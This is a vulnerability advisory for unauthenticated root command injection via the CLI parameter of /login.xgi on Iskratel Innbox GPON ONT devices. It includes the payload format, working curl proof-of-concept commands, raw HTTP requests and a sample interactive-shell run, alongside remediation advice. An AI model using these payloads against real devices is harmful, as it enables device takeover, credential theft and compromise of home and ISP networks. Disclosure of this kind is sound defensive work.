# Iskratel Innbox - Unauthenticated Remote Code Execution via login.xgi CLI Parameter

## Summary

A critical unauthenticated remote code execution vulnerability exists in Iskratel Innbox GPON ONT devices. The `/login.xgi` endpoint accepts a `CLI` parameter that passes user-supplied input directly to a shell without any authentication or input sanitization. An attacker on the network can execute arbitrary commands as root, leading to complete device compromise.

**CVSS 3.1 Score:** 9.8 (Critical)  
**Vector:** `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`

**CVSS 4.0 Score:** 9.4 (Critical)  
**Vector:** `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L`

---

## Affected Products

| Vendor | Product | Versions |
|--------|---------|----------|
| Iskratel | Innbox | All |

---

## Vulnerability Details

### CWE Classification

- **CWE-78:** Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')
- **CWE-306:** Missing Authentication for Critical Function

### Root Cause

The device's web interface exposes a CGI endpoint at `/login.xgi` intended for authentication. However, this endpoint also accepts a `CLI` parameter that is passed directly to a system shell for execution. The vulnerability has two critical flaws:

1. **No Authentication Required:** The `CLI` parameter is processed before any authentication check occurs
2. **No Input Sanitization:** User input is passed directly to the shell without filtering dangerous characters or commands

### Vulnerable Code Path

```
HTTP Request → /login.xgi?CLI=<payload> → CGI Handler → system() / popen() → Shell Execution as root
```

---

## Technical Analysis

### Request Format

The device's CGI handler parses the `CLI` parameter and executes it via shell. To capture command output, attackers can redirect stdout/stderr to a file in the web-accessible `/etc/www/graphic/` directory.

**Payload Structure:**
```
/login.xgi?CLI=exec,>,/etc/www/graphic/OUTPUT.txt,2>&1;COMMAND
```

**Breakdown:**
- `exec,>,/path/file,2>&1` — Redirect all output to a readable file (commas used as token separators by the CGI parser)
- `;COMMAND` — The command to execute
- Output readable at `/graphic/OUTPUT.txt`

### Key Observations

1. The CGI parser uses **commas as token separators** in the redirect preamble (not spaces)
2. Commands execute as **UID 0 (root)** with full system privileges
3. Output files are written to a **publicly accessible directory** without authentication
4. The device runs **BusyBox/mips Linux** with standard Unix utilities available

---

## Proof of Concept

### Step 1: Verify Vulnerability

```bash
T="192.168.1.1"
M="poc$$"

curl -s "http://$T/login.xgi?CLI=exec,>,/etc/www/graphic/$M.txt,2>&1;id;uname%20-a"
sleep 2
curl -s "http://$T/graphic/$M.txt"
```

**Expected Output:**
```
uid=0 gid=0
Linux Innbox 3.18.21 #1 SMP mips unknown
```

### Step 2: Interactive Shell

```bash
python3 exploit.py http://192.168.1.1/
```

**Output:**
```
[*] target : http://192.168.1.1/
[*] status : 200

[+] unauthenticated RCE confirmed (running as root):

    uid=0 gid=0
    Linux Innbox 3.18.21 #1 SMP mips unknown

[*] interactive shell -- type 'exit' or Ctrl-D to quit

$ 
```

---

## Impact Assessment

### Confidentiality: HIGH
- Full read access to device filesystem
- Extraction of stored credentials (admin, PPPoE, TR-069, WiFi)
- Access to private keys (stunnel, CWMP)

### Integrity: HIGH
- Arbitrary file modification
- Configuration tampering
- Firmware modification
- Persistent backdoor installation

### Availability: HIGH
- Device denial of service
- Network disruption capabilities

### Attack Scenarios

1. **ISP Network Compromise:** Mass exploitation of customer premises equipment
2. **Botnet Recruitment:** Install persistent malware for DDoS/cryptomining
3. **Man-in-the-Middle:** Modify DNS/routing to intercept customer traffic
4. **Lateral Movement:** Use as pivot point into customer LAN

---

## Remediation

### For Vendors

1. **Remove CLI parameter from login.xgi**
2. **Implement proper authentication**
3. **Input sanitization**
4. **Restrict web directory permissions**

### For ISPs/Operators

1. **Firmware update**
2. **Network segmentation**
3. **ACL enforcement**
4. **Monitoring**

### For End Users

1. **Firewall rules** — Block port 80/443 access to the ONT
2. **Contact ISP** — Request firmware update or device replacement
---

## Appendix: Raw HTTP Request

```http
GET /login.xgi?CLI=exec,>,/etc/www/graphic/out.txt,2>&1;id HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Connection: close
```

```http
GET /graphic/out.txt HTTP/1.1
Host: 192.168.1.1
```

**Response:**
```
uid=0 gid=0
```
